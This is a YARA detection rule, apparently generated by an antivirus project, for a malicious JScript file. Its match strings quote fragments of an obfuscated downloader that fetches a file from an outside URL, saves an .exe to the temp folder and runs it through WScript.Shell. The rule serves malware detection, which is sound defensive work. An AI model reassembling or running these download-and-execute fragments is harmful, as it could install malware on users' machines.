rule sig_20160328_ffbf45cb810302f126748449d4228623 {
  meta:
    description = "datamaliciousorder - file 20160328_ffbf45cb810302f126748449d4228623.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "54bfb47e74c49bad9e6b776f33ebe0a708fb7ab2e8c002f3053d044c3e574cfb"

  strings:
    $s1  = "function Awpfnjnym() {return Vkrbfy[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"zcj4lS33vHP.exe\";};" fullword ascii
    $s2  = "Tihzherlh[Nmkjrd](\"GET\", \"http://portal.ofar.com.br/o4psaf\", false);" fullword ascii
    $s3  = "do {WScript[Dwulwt](Rbqhrqtfyk() * 11)} while (Tihzherlh[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Gnydspk(Dpkiezxvr, Mvjskry){return Dpkiezxvr - Mvjskry;};" fullword ascii
    $s5  = "var Vkrbfy = function Iyrpnpx() {return WScript[Cxjeqltqez](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Vdbkhvtwc(Nwdhuoj){Vkrbfy[\"Run\"](Nwdhuoj, Oazpfuq, Oazpfuq);};" fullword ascii
    $s7  = "function Dkqdosqbl() {return ((Szfaif == true) && (Szfaif == Lumqbkmt)) ? 1 : Oazpfuq;};" fullword ascii
    $s8  = "var Lumqbkmt = false;" fullword ascii
    $s9  = "return Gnydspk(Lcyfzbxu, Jomsvvhz);" fullword ascii
    $s10 = "var Szfaif = false;" fullword ascii
    $s11 = " while (Odrpxn){" fullword ascii
    $s12 = "function Awetzpuxs(Wsgeqfvgu) {var Keape = (1, 2, 3, 4, 5, Wsgeqfvgu); return Keape;};" fullword ascii
    $s13 = "Szfaif = true; " fullword ascii
    $s14 = "function Kfwpw(){return Jcigeops;};" fullword ascii
    $s15 = "function Kjywmva(){return Cxjeqltqez;};" fullword ascii
    $s16 = "function Fefzxswl()" fullword ascii
    $s17 = "function Rbqhrqtfyk(){return 22;};" fullword ascii
    $s18 = "var Dkkpngyd = false;" fullword ascii
    $s19 = "var Pyklgpcio = new this[\"Date\"]();" fullword ascii
    $s20 = "Lumqbkmt = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}